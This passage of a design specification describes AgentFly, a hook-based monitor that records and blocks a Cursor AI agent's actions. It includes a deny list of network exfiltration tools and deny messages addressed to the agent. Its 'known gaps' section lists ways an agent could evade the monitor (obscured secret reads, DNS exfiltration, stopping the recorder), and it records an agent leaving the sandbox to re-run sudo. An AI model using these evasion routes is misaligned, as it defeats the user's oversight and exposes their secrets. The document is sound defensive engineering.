  warned, highlighted). Routine runs of allowed steps are grouped, blocks and
  warnings are pinned, and a Follow button keeps the newest step in view.
  Repeated identical blocks stay as separate rows.
- **The Why card.** Every block opens a card that shows the rule, the
  trigger step and the blocked step, and the exact messages that were sent.
  The red box with a dashed line to the rule is the moment the page must
  carry. Because the page cannot change anything, the card shows the
  `agentfly rules …` command to run, not an "allow once" button. The owner
  asked that the card can be hidden and resized; how is decided in the UI card.
- **Health strip.** Shows the recorder's status, and a big red **OFFLINE**
  banner appears when the page cannot reach the recorder, so a dead recorder
  never fails silently.
- **Tabs.** History (past sessions, from the local store, by workspace), Rules
  (the active rules, read-only), and Graph (today's lane graph).
- **Half-screen first.** The page is mostly used on half of the screen (about
  700 pixels wide), so that is the main layout, not a fallback.
- The live trail refreshes about once a second. No chat view: the page never
  shows file contents or agent replies, because none are stored.

---

## 7. Install, run, uninstall

Macs only in v1. Target flow:

```
brew install volkovyy-00/tap/agentfly      # or: uv tool install agentfly-recorder
agentfly init -g                           # one sudo password prompt
agentfly start
```

Then open any project in Cursor. It is watched and protected with no
per-project setup. (A per-project `agentfly init` is deferred; section 12.)

- **Distribution (D6).** A Homebrew formula in the owner's own tap, and the same
  wheel (with the built page inside) on PyPI under the name
  **`agentfly-recorder`**, for `uv tool` and `pipx`. The Python import package
  and the commands stay `agentfly` and `agentfly-hook`. The CLI uses Python's
  built-in `argparse`, one module per command. The build backend is hatchling.
- **Known name clash.** An unrelated PyPI project named `agentfly` also claims
  an `agentfly` command, and the two cannot share one environment. Which one
  wins on `PATH` depends on install order. `agentfly doctor` checks that the
  `agentfly` on `PATH` is ours.
- **`init -g`** writes the system hooks file, installs the hook client and its
  bundled Python, and sets up the system-owned rules file, with one `sudo`
  (D1, D2, D5). Before it asks for the password it checks the package it is
  about to run as root (see "The package check" below). It writes only events from a known list for the installed
  Cursor version. A Cursor version newer than the newest listed one (compared part
  by part, as numbers) gets that newest version's events, and `init -g` prints one
  warning line naming both versions; it says to quit and reopen Cursor after any
  Cursor update and then run `agentfly doctor` (D32). The hash record keeps the
  real version as of the install or repair that wrote it. Any other version that
  is not listed (older, between two listed ones, or not dotted numbers) is
  refused with nothing written, as is an unknown event (D23).
  The move from `~/.config/flightrecorder` (D7) has already happened at the
  recorder's first start; `init -g` relies on it. Running
  it twice changes nothing; entries of other tools in the hooks file are left
  as they are. In v1, remove AgentFly's own repo-level `.cursor/hooks.json`, or
  its five events (`beforeShellExecution`, `beforeReadFile`,
  `beforeMCPExecution`, `preToolUse` and `afterFileEdit`) arrive twice.
- **The package check (V3c).** `init -g` and `uninstall` run AgentFly's own
  Python package as root, and that package sits in a tool environment your user
  can write. So, before any password prompt, both hash every file of every
  distribution in that environment. Each file must equal the hash in its
  distribution's own `RECORD` and be a plain file: a link, or a file behind a
  linked folder inside the environment, is a mismatch (links above the
  environment, such as a home folder on another disk, are resolved once and
  trusted). A file in
  `site-packages` that no `RECORD` lists is a mismatch (except `__pycache__` and
  the files uv, pipx and Homebrew leave: `_virtualenv.py`, `_virtualenv.pth`,
  `pipx_shared.pth`, `homebrew_deps.pth`), and so is a folder your user cannot
  list. A mismatch stops the command, names the file and says to reinstall the
  package and run it again; an extra file stays through `uv tool install --force`
  (measured, uv 0.9.5), so the message says to delete it or to `uv tool
  uninstall` first. What differs from the root-owned record made at the last
  `init -g`, though every file matches its own `RECORD`, is listed and **asked**:
  a changed version ("changed from X to Y"), a new or removed dependency, and a
  distribution at the recorded version whose files differ from the stored hashes
  (a rebuild, or a reinstall under another Python: "same version X, files differ
  from install but match RECORD (2: a.py, b.py): expected only if you reinstalled or
  rebuilt", which names the first three changed files).
  The commands go on only after you confirm in a terminal. With no record yet (a
  first install, or one from before V3c) there is nothing to differ from. An
  editable install, or a run from a source checkout, is refused; install the
  wheel (`uv build && uv tool install --python 3.12 dist/*.whl`). After a yes the versions
  and hashes are stored in the root-owned record. Root then runs
  `python -I -S -B -X pycache_prefix=/var/empty -c <bootstrap>`: no `site`, so
  no `.pth` and no `sitecustomize`, and no `__pycache__` is read or written.
  The interpreter is the bundled, root-owned Python whenever it is installed
  and matches its recorded hash; a first install, and a repair that replaces the
  bundled Python, run on the tool environment's own base interpreter. The base
  Python (uv's or Homebrew's, which other projects use) is not hashed, so
  upgrading it stops nothing.
- **Run (D8).** `agentfly start`, `stop` and `status` use `brew services` for a
  Homebrew install (the package sits in `<prefix>/Cellar/agentfly/`) and
  AgentFly's own LaunchAgent otherwise. `agentfly serve` runs the recorder in
  the foreground, which is how developers run it.
  - `start` writes `~/Library/LaunchAgents/dev.agentfly.recorder.plist`
    (`RunAtLoad`, `KeepAlive`; it runs `serve` from the same install) and loads
    it into your login session, then waits for `/health`. Run again, it changes
    nothing, or reloads the job if the file would differ. It needs no `sudo`
    and refuses to run under it. In a Homebrew install it first unloads and
    removes a LaunchAgent of its own that an earlier install left, because two
    jobs would fight over port 8787.
  - `stop` unloads the job and deletes the file, as `brew services stop` does,
    so the recorder stays down at the next login too; `start` brings it back.
  - `status` names the manager, says whether the job is loaded and running, and
    shows what `GET /health` on port 8787 answers (exit 0 only when it answers).
  - The recorder's access log is not kept; its start-up messages and errors go
    to `~/.local/share/agentfly/logs/recorder.log`.
- **`agentfly doctor`** prints one line per check (ok, warn or fail) and exits 1
  if any fails. It needs no password. The checks: the hash record exists; the
  bundled Python and the hook client match their recorded hashes (D1); AgentFly's
  package and its dependencies are what `init -g` hashed (the "package" line;
  a version change since is a warning, a changed or extra file a failure); nothing
  in AgentFly's system folder can be written by your user, and it is owned by
  the system user (D5); AgentFly's entries in the system `hooks.json` are the
  ones `init -g` wrote; the service is loaded and running, its file is what
  `start` writes, and `KeepAlive` is set (D4), and in a Homebrew install no
  LaunchAgent of ours is loaded next to Homebrew's job; `agentfly` on `PATH` is
  ours (the same environment, not another venv on the same Python).
  It also compares the registered events with the known list (for a Cursor newer
  than the newest listed one, with that newest version's list: the line warns
  "unchecked Cursor version" and says to quit and reopen Cursor, then run
  `agentfly doctor`, D32), and reads
  Cursor's Hooks log for "Invalid … config" or "Failed to parse" lines about
  AgentFly's file, or "No enterprise hooks configuration found" (Cursor has not
  been restarted since `init -g`); each is a failure, not a warning (D23). It reads
  the newest start folder only, at most 64 logs (none when there are more), each
  only if it is a plain file and at most its last 4 MiB: the agent's user can write
  that folder. When Cursor's version is on the verified list, a log that says
  nothing (no logs, no Hooks log, no line about the system file, more than 64 logs)
  is a warning. When it is not on the list (a newer version, any other, or one
  `doctor` cannot read, which the agent can bring about), that log is the only sign that the hooks
  run, so each of those cases fails, and the line says to quit and reopen Cursor,
  then run `agentfly doctor` (D32; decided by the owner, 2026-10-21). A "Loaded"
  line is believed: the same people can write a forged one, and no check here can
  tell it from Cursor's. A
  missing hook client file turns it red (D5). It warns when
  `~/.claude/settings.json` holds hooks on a gate event (D24, section 8). Each
  fault turns its own line to fail: a check that depends on something another
  line already fails on says "not checked".
- **Uninstall (D8).** Run `agentfly uninstall` *before* `brew uninstall`:
  Homebrew leaves the service file behind. Uninstall first copies an edited
  rules file (not an unedited shipped default) to
  `/Library/Application Support/Cursor/agentfly-backups/rules.toml.<stamp>`, a new
  name each time, as root's file at mode 0600 (the agent's user reads no copy), and
  prints where (D30). To restore it after `init -g`, `sudo cp` it over the
  `rules.toml` that `init -g` wrote (the target keeps root's 0644; with no file
  there the result is 0600, which the recorder cannot read), then `agentfly stop`
  and `agentfly start`. A link, a folder, a pipe or a file over the size limit
  there is named in one line and not copied. A copy it cannot write (also a backups path that is a link or a file),
  or a rules file root cannot read, stops it with the hook entries, the folder and
  the file untouched. Then it
  removes AgentFly's hook entries and the system folder (under `sudo`, asked
  once), then, as your own user, stops and removes the service. Run it without `sudo`: the service
  belongs to your login session. If the system part fails the service is not
  touched; run `agentfly uninstall` again. If you run `brew uninstall` first,
  the system-owned hook client stays behind, keeps denying outbound commands,
  and tells you to run `agentfly start`, which no longer exists; remove the
  entries by hand or reinstall and uninstall properly.
- **Publishing.** Pushing to PyPI or a Homebrew tap is outward-facing; the owner
  approves each release, and the PyPI name is re-checked first.
- **Developers** can still run the recorder from a clone with
  `uv run agentfly serve`; AGENTS.md has the commands.

---

## 8. Hooks and the hook client

### Events (D9)

The registered events are:

| Kind | Events |
|---|---|
| Gates (can deny) | `beforeShellExecution`, `beforeReadFile`, `beforeMCPExecution`, `preToolUse` |
| Record only | `afterFileEdit` (edit text dropped), `sessionStart`, `sessionEnd`, `subagentStart` (its only job is the parent link, section 5) |
| Never registered | `beforeSubmitPrompt`, `afterAgentResponse`, `afterAgentThought` (they carry prompts and replies) |

`preToolUse` is the only gate for the agent's Write and Grep tools, so it is
needed. `afterShellExecution` is registered only if the memory experiment goes
ahead, and then only its exit code is kept.

**Only events Cursor accepts (D23).** Spike S5 (Cursor 3.24.12) confirmed that
one unknown event name makes Cursor reject the whole hooks file, with an error
only in its Hooks log, and then no AgentFly hook runs. So `init -g` writes only
events that the installed Cursor version is known to accept (a version newer
than the verified list gets the newest listed version's, D32 below), and
`doctor` checks the registered events against that list and reads the Hooks log
(section 7). A Cursor update that drops an event is caught by `doctor`, not
prevented. MCP events are untested.

**A Cursor newer than the verified list (D32, amends D23).** AgentFly cannot keep
up with every Cursor release, so a version newer than the newest listed one,
compared part by part and as numbers, is accepted: it gets the newest listed
version's events, `init -g` warns once, and the hash record keeps the real
version as of the install or repair that wrote it. A version that is not newer
and not listed is still refused, and so is anything that is not dotted numbers of
at most 32 characters. The version is read from Cursor.app's `Info.plist`, which
the agent can rewrite, and is only ever compared. The file is opened without
blocking and read only if it is a plain file (a named pipe or a folder is refused
before anything is read); at most 1 MiB and one byte of it is read, and a larger
file is refused unparsed. It is parsed only if it starts with `<` (after an optional
UTF-8 byte-order mark) and its header holds nothing before `<plist` but an XML
declaration and, at most, Apple's `<!DOCTYPE plist PUBLIC "…" "…">` (Cursor's
own). The declaration is not judged: the encoding it names is the parser's, so
ISO-8859-1 and cp1252 are read and one Python does not know fails the parse,
while UTF-16 is refused unparsed (its byte-order mark, or the NUL bytes between
its characters, are not that header). No internal subset, comment or other
declaration, because a DTD of its own makes the parse cost minutes from under
1 MiB (pyexpat decodes an attribute default again for every element; plistlib
refuses only entity declarations). A binary plist is refused unparsed too
(plistlib's binary reader copies an object once for each object number that
points at it, hundreds of megabytes from under 1 MiB). Each refusal is one line
that names the cause, and a malformed XML plist is refused when it fails to
parse. A refused plist leaves the version unread, which falls as a version off the
list does (below). The Hooks log lives in a folder the agent's user can also
write while `doctor` walks it, so below Cursor's `logs` folder (the path to it is
the owner's and may run through a link) each folder is opened without following a
link, through the open descriptor of the one above it. A folder swapped for a
link or a non-folder is skipped, as a missing log is, and one real folder moved
onto many names is opened under each but listed once. A rejection line is shown
whole up to 1,000 characters (Cursor's own, naming the 21 valid events, is about 450),
cut with "…" beyond, and always with unprintable characters escaped. The
risk is accepted: if that Cursor dropped one of the
events, it would ignore the whole hooks file (S5), and protection would be off
with no sign inside Cursor. So `doctor` fails when Cursor's Hooks log shows
AgentFly's hooks rejected or not loaded and, for any version that is not on the
list (newer, any other, or unreadable), also when the log cannot confirm that they
loaded (section 7; the owner, 2026-10-21). `init -g` and `doctor` both say: after
any Cursor update, quit and reopen Cursor, then run `agentfly doctor`. A release
adds a version to the list once it is checked.

**Where hooks come from (D24).** Cursor runs hooks from several places side by
side: the system file, the user and project `hooks.json`, and also
`~/.claude/settings.json`, which the agent can write. In spike S2 an allow-all
shell hook in the user or project `hooks.json` did not cancel AgentFly's deny.
No spike tested `~/.claude/settings.json` that way, and how Cursor combines an
allow from any other source with AgentFly's deny on the other events is
untested. `doctor` warns when
`~/.claude/settings.json` holds hooks on a gate event; that becomes a failure
if an allow turns out to override.

### The hook client (D5, D18)

- Called as `agentfly-hook <agent> <event>`. Only `cursor` is built; a small
  step turns Cursor's input into AgentFly's own shape. An unknown agent gets
  "allow", exit 0 and a warning on stderr.
- One file, standard library only, run with `python -I -S` on the bundled Python.
  Target: 95 % of calls under 50 milliseconds. It never starts the full command
  line program. The packaging card (V3a) re-measures the target on the bundled
  Python.
- It **always prints valid JSON and exits 0**. Exit code 2 would block the
  action, so every path is wrapped. Stdout holds only the JSON answer; all
  logging goes to stderr.
- The path to the client in `hooks.json` is quoted (an unquoted path with a
  space made Python exit 2, and Cursor denied every action).
- It sends the token in a header and uses `conversation_id` as the session key.
  Subagent events keep their `parent_tool_call_id` (section 5).
- It always posts to port 8787 and reads no port file or environment variable
  (D25). Tests set the client's port inside their own harness.
- Each hook entry has an explicit timeout. The wait for the recorder is half a
  second (0.5 s).

### Stripping, before anything else

The client throws away content before it logs or sends:

- `content` of `beforeReadFile`;
- `edits` of `afterFileEdit`;
- `output` of `afterShellExecution`;
- the contents of `tool_input`. From it the client keeps only the target path of
  file tools (`file_path` for Read, Write and Grep; never `content`, `pattern`
  or `command`), so R0 can still deny a Write to a guard file, and Grep's `glob`
  (a file-name pattern) and `output_mode`, so a search can mark (section 5). A
  `glob` or `output_mode` that is not a string is sent as `null`. For MCP calls it
  keeps only the server and tool names.

### Duplicates

One action can fire two hooks: a general `preToolUse` and a specific one
(`beforeShellExecution`, `beforeReadFile`, `beforeMCPExecution`); an edit also fires
`afterFileEdit`. They make one step (V2c; Cursor 3.25.9 facts):
- **Same `tool_use_id` in the same chat: one step, for every kind of event, however
  many there are.** On 3.25.9 a shell pair matched in 34 of 34 and a read pair in 28 of 28
  (all 59 read paths were absolute). One id also covers an edit's `preToolUse` Read and
  Write. 3.24.12 sent no id on `beforeReadFile`.
- **Fallback for events without an id** (same chat, same absolute path run through
  `posixpath.normpath`, within 5 s): a `beforeReadFile` joins the oldest unpaired
  `preToolUse` Read; an `afterFileEdit` (it never has an id and fires for a create, not
  for an edit) joins the latest `preToolUse` Write. The waiting list lives in memory only,
  expires, and holds at most 32 entries per chat (the oldest is dropped). With no pair
  the events stay separate steps.
- The second hook updates the step that exists (same order number and step id; nothing is
  renumbered). The merged step has the specific event's file or command; kind `edit` if
  either hook writes (`preToolUse` Write or `afterFileEdit`), else the specific event's
  kind; the strictest verdict of the gate events (`afterFileEdit` never raises it); and it
  is marked if either hook marked.
- The rules still decide every event on its own, and every answer and its timing are the
  same as without the merge. Not covered: MCP without an id, a restart between the two
  hooks, steps saved before V2c, and edit tools other than `Write`.

### The answers

- **Block:** `{"permission":"deny","user_message":"…","agent_message":"…"}`. The
  rule text goes in both messages (where the event accepts both), because one of
  them has been reported ignored in some Cursor versions. `agent_message` adds: "Do not retry with another tool
  or language. Stop and tell the user."
- **Warn on a shell command:** `{"permission":"ask","user_message":"…","agent_message":"…"}`,
  the rule text in both; `agent_message` adds: "If the user skips this, do not retry with another
  tool or language."
- **Rules limit:** an unfinished `block` rule (section 5, "What a file may cost") is a deny and an
  unfinished `warn` on a shell command an `ask`, both with the rules-limit message in place of the
  rule's; R0's and R1's answers never change.
- **Allow, warn on other events, and highlight:** plain allow; the page carries
  the mark.

---

## 9. When the recorder is down

Cursor must never be left without protection just because the recorder was
stopped (D4). If the recorder does not answer in time, or answers with a 401 or
403 (the wrong token), or the client cannot read its own input, the hook client
applies the **offline guard**, a fixed, simple subset of the rules. A wrong
token is never treated as an allow.

- it **denies** outbound commands: `curl`, `wget`, `nc`, `scp`, `ssh`,
  `rsync`, `git push`, `gh`, `aws`, every inline `python -c` / `node -e` /
  `perl -e` / `ruby -e` one-liner (whatever it contains; the forms section 5
  lists), and the same commands wrapped in `bash -c`, `env` or `sudo`. Sending to your own computer (`localhost`, private
  addresses) is allowed;
- it **denies** commands that touch AgentFly's guard paths (R0), and any Read, Write
  or Edit (every file tool, `StrReplace` and `Delete` included) whose target is a
  guard path: the `file_path` of a read, an attachment or a tool's input, with case,
  `~`, `//`, `/./` and `..` resolved (D4);
- it **allows** everything else and writes down that it did so. Cursor shows
  nothing for an allow with a message (S1), so the visible signals are the
  health strip and the log, not a message in the chat;
- a command it cannot parse is denied only if its raw text names one of those
  tools;
- every deny message tells you to run `agentfly start`.

The guard is a simpler, word-level copy of the real normalisation, tested against
the same cases.

**The accepted cost:** whenever the recorder is down (not started, crashed or
killed), in every project and even with no secret read, the agent cannot run
those commands. launchd `KeepAlive` restarts a recorder that was killed, so this should be
brief; it does not help when the service was deliberately stopped (`agentfly
stop`, `brew services stop`), which is why R0 blocks those commands. While the
recorder is down your own rules do not run, only the fixed subset above.

**A missing client file is a loud failure, not the offline guard (D5).** If
AgentFly is registered but its hook client file is missing or broken, no client
runs and so no guard can: Python exits with code 2 and Cursor blocks every
action (this happened in spike S2 with an unquoted path). That is loud rather
than silent, and `doctor` turns red. The offline guard covers only a recorder
that is down. A plain "allow" is answered only after `agentfly uninstall` has
removed the registration.

Not built in v1 (a possible v1.1): a per-chat marker kept by the hook client
itself, so a mark survives a recorder outage.

---

## 10. Protecting AgentFly itself

The agent runs as your macOS user, so by default it could try to switch AgentFly
off. The promise (D1) is **prevented for config and rules; detected for
tampering with installed code.**

**Prevented** (the agent cannot do it without your password):
- editing the hooks registration, the hook client, the bundled Python, or the
  active rules: all are owned by the system user (D2, D3, D5). In the S2 test,
  both the edit tool and a Python one-liner got "Permission denied", and `sudo`
  asked for a password.
- A rule change needs `sudo` (section 5). This costs one password at install and
  one per rule change.

**Detected** (the agent might manage it, but it will be noticed): patching
AgentFly's own installed code in its tool environment, which your user can write
to. Before it asks for your password, `init -g` and `uninstall` compare every
file of every distribution with the hashes stored at install (or with the
distribution's `RECORD` after a version change, which you confirm) and refuse to
run a changed package as root; `agentfly doctor` reports the same comparison on
its "package" line. R0 also denies touching that environment and reinstalling
AgentFly with `uv tool`, `pipx` or `brew` (section 5). The recorder's per-session
hash check and a banner on the page are not built.

**Your `sudo` does not reach the agent (D3).** Spike S2 could not tell whether a
`sudo` password entered in your own Terminal could be reused from the agent's
terminal, so S5 re-ran the check. After the owner ran `sudo -v` in Terminal,
`sudo -n true` in the agent's shell failed with "a password is required" (exit
1). The rule-change flow therefore stands.

**The sandbox is not a control (D22).** Decisions never depend on Cursor's
`sandbox` field; it is only recorded. A command AgentFly denies is denied
whether it runs inside Cursor's sandbox or outside it. The agent can leave the
sandbox on its own: in S5, after `sudo` failed inside the sandbox, the agent
re-ran it outside and Cursor asked nothing.

Other measures:
- The recorder listens on `127.0.0.1` only, never on the network.
- A random token, in a file only your user can read, goes with every hook
  request (`POST /hook`). Requests without it are rejected, and hook requests
  must be JSON. Every request, including the page's, must carry the host name
  `localhost:8787` or `127.0.0.1:8787`. The page itself and its read-only data
  need no token, because a page in a browser cannot keep one secret and can only
  read.
- The token does not stop the agent, since it runs as you, so R0 blocks reading
  it. With the token a forged `POST /hook` could add fake steps or mark a
  session. That can only make AgentFly stricter or noisier, never looser; the
  owner accepts it.
- Nothing on the port can loosen anything (section 11).
- The optional Neo4j login is a file in `~/.config/agentfly/`, read only by the
  recorder, never in the terminal's environment, never given to the hook client.
- The page never sends database questions. The recorder has a small fixed set of
  named read-only queries; values are passed as parameters, never pasted into
  the query, with a time limit.

**Known gaps, said openly:**
- R1 matches names. A determined agent can hide a read (`cat .en*`), copy a
  secret into a normal file and send it from a new chat, send data inside DNS
  lookups, tunnel through a local address, or use Cursor's own web tools (which
  may not pass through the hooks). This is a first layer, not a sandbox.
- Cursor Cloud Agents are not covered by a local hooks file.
- Cursor's own sandbox proxy may stop a command before AgentFly sees it, and the
  agent may re-run it outside the sandbox on its own, which AgentFly does see.
  The sandbox is not relied on for anything (above).
- Cursor also runs hooks from `~/.claude/settings.json`, a file the agent can
  write. How an allow from there combines with AgentFly's deny is untested
  (section 8).
- "Always Run" on a warned shell command removes that warning (section 5).
- When the agent issues the `.env` read and a `curl` in one reply, the `curl` is
  allowed: Cursor may even run the shell hook before the read hook (V3a saw it,
  with the same `generation_id`). Seen again on Cursor 3.26.16 on the plain prompt
  "Read .env, then run curl …": the agent sent both calls in one reply, and the
  recorder stored the two steps 0.6 ms apart (with a Glob in place of the read,
  47 ms apart, the same outcome). The `curl`'s text is fixed before the file comes
  back, so it cannot carry the file's content (owner 2026-10-23: docs only, not a
  v1 blocker).
- A text search marks only when it is aimed at a secret (section 5). A whole-project
  search with no glob returns lines of every secret file git does not skip (a
  hidden `.env`, `demo.key`; in a folder that is not a git repository, or with a
  `.env` that `.gitignore` does not list, all of them) and does not mark. Cursor
  3.27.6 sends no result in `postToolUse` for a search (`{"pattern":…,"success":true}`
  for every `output_mode`, no file names), so AgentFly cannot tell what came back,
  and `postToolUse` is not registered. A glob that misses the samples with `*`,
  such as `credential*.py`, `*.env.local` or `.env*.local`, does not mark either
  (its `*` is read as one letter, owner 2026-10-23). An empty or blank `glob` is
  no filter to ripgrep, so it is a search with no glob. Names-only searches
  ("files_with_matches", "count") never mark, so a secret could be guessed letter
  by letter through them. A glob past the search bound (section 5) marks, whatever
  it names. Past the bound on listing names against `path_except` (2,000 compares,
  section 5) the exceptions are not used, so the search marks: `.env??.example`
  marks, `.env?.example` does not. ripgrep's `?` and classes match one byte, and AgentFly judges a glob by
  characters: a rule name written in ASCII with a `?` or a `[!…]` and no `*` after
  it (`secret?`) is not read by `secret??`, which lists `secreté`, and a name that
  folds to ASCII (`ſecret.txt`) is not read by `??ecret.txt`. The packaged lists
  are not affected: each name such a glob could reach ends in `*` or is exact ASCII.
- The agent can read the token (above).
- R0 matches names, so a deliberately obscured command can still reach
  `agentfly stop`, `brew services stop` or the session-notes file. Stopping the
  recorder this way means your own rules stop running (only the offline subset
  applies, section 9), and deleting the session notes makes marks forgotten.
  The result is detected by `doctor` and the health strip, not prevented.
- The package check is run by AgentFly's own code, from the tree it checks, so
  code that has been tampered with could hide the tampering. The recorded hashes
  live in the root-owned record; nothing outside the tool environment checks the
  checker.
- The base Python the tool environment runs on (uv's or Homebrew's) is not
  hashed, and its `__pycache__` is writable by your user. A first install, and a
  repair that replaces the bundled Python, run root on that base interpreter;
  every other run uses the bundled one.
- `RECORD` is trusted whenever something changed: an upgrade, or a rebuild at the
  same version, is checked against the distribution's own `RECORD` and asked, so
  the list you confirm ("changed from X to Y", "same version X, files differ ...")
  is the control, and someone who edits a file and its `RECORD` row together gets
  a question, not a stop. The first `init -g` after V3c on an older install has
  no stored hashes and is checked against `RECORD` alone.
- `sudo agentfly init -g` or `sudo agentfly uninstall` typed by hand runs the tool
  environment's Python as root unchecked and with `site` on (`.pth`,
  `sitecustomize`, byte-code). The check and the `-I -S -B` command line exist
  only on the path where `agentfly` asks for the password itself. The README says
  to run both without `sudo`. A hand-typed `sudo agentfly uninstall` removes the
  system files, then prints that the recorder service was not touched (`sudo`
  cannot reach your login session) and says to run `agentfly uninstall` as your
  own user, without `sudo`, to stop and remove it.
- A `.pth` file in the tool environment runs inside the checking process (the
  user's own `agentfly`, started with `site` on) before the check can report it,
  so the check stops naive tampering only. R0 (which denies touching the
  environment) and root's `-I -S -B` command line are the real defences.
- A file changed after the check and before root imports it (while the password
  prompt waits) is not caught; root's second hashing records what it sees and
  protects nothing.
- A tool environment outside the default places (a custom `UV_TOOL_DIR`,
  `PIPX_HOME` or Homebrew prefix) is checked by `init -g` but not guarded by R0
  by path; the Homebrew layout has not been tried on a real formula.
- A folder in `site-packages` that your user cannot list is reported, because root
  can read it; the check does not look inside.
- "Write a script file, then run it" is not caught: only inline one-liners and
  heredocs fed to the shells and interpreters listed in section 5 count.
- The command cleaner (section 4) keeps less than a secret, not nothing. An
  option's value equal to an existing workspace file's name is saved as that path
  (a secret would have to be a file's name, which AgentFly saves anyway, owner
  2026-10-23). A web address whose host is itself a token (`curl https://<JWT>`)
  keeps rule 5's last two parts. Only the six web tools have option lists; for
  any other program a website given after a value, not right after its option,
  keeps its name (`tool -o out https://a.b.com` keeps `a.b.com`), and so does
  one with a space in it after no option (`tool "https://a.b x"` keeps `a.b x`).
  A header the agent splits into words (`-H X-Token: abc.def`) leaves
  `abc.def` as a website, which curl itself also contacts. The hosts saved for a
  step are read from the kept words, so a kept file name (`.env`, `.`) or a dotted
  program name (`python3.12`) is counted as a host too. A web tool behind a
  wrapper that rule 2 does not list (`caffeinate curl …`), behind `{`, `!`, `if`
  or `while`, or in a process substitution (`<(curl …)`) is read as any
  program's words: a `://` word after an option is `<arg>`, a positional one
  keeps its website name. A `)` inside a part (`(curl x.com) >out`) is not cut,
  so the word it closes is no website. A double-quoted `"$D"` that holds an
  option is read as one word (`curl "$D" tok.abc x.com` keeps `tok.abc`), so that
  `scp "$FILE" deploy@prod.example.com:/srv/` keeps its host. The target of a
  bare redirection after a web tool is read as its other words are
  (`curl x.com > tok.abc` keeps `tok.abc`).

---

## 11. Recorder API

The recorder on port 8787 serves exactly two kinds of route (D19):

| Route | What it does |
|---|---|
| `POST /hook` | The hook client's request. Token, JSON body and an allowed host name required. |
| `GET /` and `GET /assets/*` | The page. |
| `GET /health` | Recorder status, for the health strip and `doctor`. |
| `GET /api/steps` | Live steps from memory. |
| `GET /api/sessions` and `GET /api/sessions/{id}/steps` | Past sessions, from the local store. |
| `GET /api/rules` | The active rules, read-only. |

There is **no** endpoint that edits, adds or removes rules, allows an action
once, adds an exception, resets a session's "secret was read" mark, or deletes
data. Those happen only on the command line: rule changes through
`sudo agentfly rules apply`, deletion through `agentfly wipe` (which keeps the
marks), and a mark clears only with a new chat. FastAPI's own `/docs`, `/redoc` and `/openapi.json` are
switched off.

A test lists every `(method, path)` the app serves against this whitelist and
fails on anything else, including any method other than GET apart from
`POST /hook`. HEAD on an API route answers 405. Every card that adds a route
adds its line to the whitelist.

---

## 12. Not in v1

- **Plain-language drafting** (D13): not in v1; drafts come from flags
  (section 5).
- **Memory across sessions** (D16, goal 4): not in v1 (owner, 2026-10-21); it may
  come back after the release as an experiment with one small test.
  One idea is an option on R1 where a secret read in this workspace in the last
  24 hours still counts, loaded into memory at start and never queried live.
  Another is a short brief given to the agent at session start. Spike S5 was a
  smoke test of that brief (two chats per arm): it reached the agent, which
  used it. That says nothing about value; it only unlocks the pre-registered
  A/B test.
- **A per-project `agentfly init`** (D20): deferred. The global install already
  covers every project. If you later want only some projects watched, a
  system-owned watch list is the safe shape and needs no change to the hooks.
- **Other agents** (D18): the hook client takes an agent name now, but only
  Cursor is built. Claude Code may come later; if both are installed, events are
  de-duplicated by `cursor_version`.
- **Linux and Windows.** Paths follow XDG, which keeps Linux cheap later.
- **Publishing** the Homebrew tap and the PyPI package: needs the owner's
  approval per release.
- **Not built:** a shadow period and signed rule sets; a rule form or draft
  download in the page; a chat view, run diff and replay scrubber; Neo4j as a
  requirement; Cursor Cloud Agents.

---

## 13. Glossary

- **Agent:** the AI in Cursor that can act on its own.
- **Hook:** a small program Cursor runs before an action.
- **Hook client:** AgentFly's hook program, `agentfly-hook`.
- **Recorder:** the small program on your machine that receives the hook
  messages, decides and keeps the notes.
- **localhost:** "this machine". A page at localhost is not on the internet.
- **Session:** one chat with the agent.
- **Subagent:** a helper the agent starts for a part of the job. Cursor gives it
  its own chat id; its events point back to the parent through
  `parent_tool_call_id`.
- **Hooks log:** the log in Cursor where it reports a hooks file it could not
  load.
- **Step:** one action the agent took.
- **Workspace:** the project folder open in Cursor.
- **Rule:** a written condition that decides allow, warn or block.
- **Rule kind:** a fixed type of rule written in Python (for example
  `after_then`); the rules file fills in its parameters.
- **Sensitive file:** a file likely to hold passwords or keys.
- **Mark:** a note on a session: "a secret was read here".
- **Offline guard:** the small fixed set of rules the hook client applies when
  the recorder does not answer.
- **System-owned (root-owned):** a file your user, and so the agent, cannot
  change without your password.
- **sudo:** the macOS command that asks for your password to act as the system
  user.
- **launchd / KeepAlive:** the macOS service manager, and its setting that
  restarts a program when it stops.
- **SQLite:** a small database stored in one file; the default local store.
- **Neo4j:** a graph database; an optional extra copy in v1.
- **curl / wget / nc / scp:** programs that send or fetch data over a network.
- **Token:** a random secret string kept in a file; the hook client sends it so
  the recorder knows the request is from AgentFly.
- **Port:** the numbered door on your machine the recorder listens at (8787).
- **Hash:** a short fingerprint of a file; if the file changes, the fingerprint
  changes.
- **Heredoc:** a way to write a block of text inside a shell command
  (`<<EOF … EOF`).
- **MCP:** Cursor's way of giving the agent add-on tools.
- **Normalisation:** rewriting a command into a plain, comparable form (for
  example, looking inside `bash -c '…'`) before a rule reads it.
- **Backtest:** replaying a rule change over your stored sessions to see what it
  would have done.
- **Trusted folder:** Cursor only runs project-level hooks in folders you marked
  trusted.
